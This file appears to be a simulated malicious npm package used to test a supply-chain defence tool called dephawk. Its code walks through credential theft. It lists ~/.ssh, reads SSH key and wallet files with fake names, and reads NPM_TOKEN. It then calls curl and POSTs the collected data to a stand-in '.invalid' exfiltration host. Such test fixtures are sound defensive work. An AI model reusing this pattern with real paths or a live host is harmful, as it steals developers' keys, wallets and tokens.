// ⚠️  SIMULATION ONLY — this package exfiltrates nothing.
//
// It pretends to be a typical supply-chain attacker so dephawk has a realistic
// target to catch. Every target is deliberately fake or harmless:
//   - the SSH and wallet paths use made-up filenames that do not exist
//   - listing ~/.ssh is read-only recon, and the count goes nowhere
//   - the copy's source is that non-existent key, so nothing is ever copied
//   - the token on the curl command line is a made-up string
//   - the "exfil" host is a `.invalid` domain that can never resolve (RFC 6761)
//   - the env read grabs a variable but sends it nowhere
// Each step is wrapped so that a dephawk block on one does not stop the others,
// which lets the report show every attempt.

// Access fs through the namespace (fs.readFileSync) rather than a named import:
// a named `import { readFileSync }` binds before dephawk patches the module and
// would slip past interception — exactly the limitation documented in the README.
import fs from 'node:fs';
import childProcess from 'node:child_process';
import { join } from 'node:path';
import { homedir, tmpdir } from 'node:os';

const SSH_DIR = join(homedir(), '.ssh');
const FAKE_SSH_KEY = join(SSH_DIR, 'id_rsa_dephawk_demo_fake');
const FAKE_WALLET = join(homedir(), '.config', 'solana', 'id_dephawk_demo_fake.json');
const FAKE_LOOT = join(tmpdir(), 'dephawk-demo-loot-fake');
const FAKE_TOKEN = 'ghp_dephawkDEMOnotARealTokenXX0';
const FAKE_EXFIL_HOST = 'https://collector.dephawk-demo.invalid/exfil';

export async function unleash() {
  const loot = {};

  // 1. Recon first: listing ~/.ssh names every key on the machine, and every
  //    host in known_hosts, without opening one of them.
  try {
    loot.keyCount = fs.readdirSync(SSH_DIR).length;
  } catch {
    // Blocked by dephawk, or there is no ~/.ssh here. Either is fine.
  }

  // 2. Try to read an SSH private key (fake filename — never a real key).
  try {
    loot.sshKey = fs.readFileSync(FAKE_SSH_KEY, 'utf8');
  } catch {
    // Blocked, or the fake file simply isn't there.
  }

  // 3. Go for a crypto wallet key, the payload of choice in recent npm
  //    compromises (fake filename again).
  try {
    loot.wallet = fs.readFileSync(FAKE_WALLET, 'utf8');
  } catch {
    // Blocked, or absent.
  }

  // 4. Copy it out with `cp`, which takes a whole directory in one call.
  //
  //    The source stays the *fake* key, deliberately: observe mode records
  //    without blocking, so a real path here would mean the demo actually copied
  //    someone's keys into the temp directory. A sample that has to be trusted
  //    is not a sample.
  try {
    fs.cpSync(FAKE_SSH_KEY, FAKE_LOOT, { recursive: true });
  } catch {
    // Blocked by dephawk, or the fake source isn't there.
  }

  // 5. Grab an npm token from the environment.
  try {
    loot.npmToken = process.env.NPM_TOKEN ?? null;
  } catch {
    // dephawk blocked the secret read in enforce mode.
  }

  // 6. Shell out with a credential on the command line. dephawk records the
  //    spawn but redacts the token out of its own report.
  try {
    childProcess.spawnSync('curl', [
      '-s',
      '-H',
      `Authorization: Bearer ${FAKE_TOKEN}`,
      FAKE_EXFIL_HOST,
    ]);
  } catch {
    // Blocked by dephawk.
  }

  // 7. Phone home. The host is unresolvable, so nothing actually leaves.
  try {
    await fetch(FAKE_EXFIL_HOST, {
      method: 'POST',
      body: JSON.stringify(loot),
    });
  } catch {
    // Blocked by dephawk, or DNS failed for the .invalid host.
  }

  return loot;
}
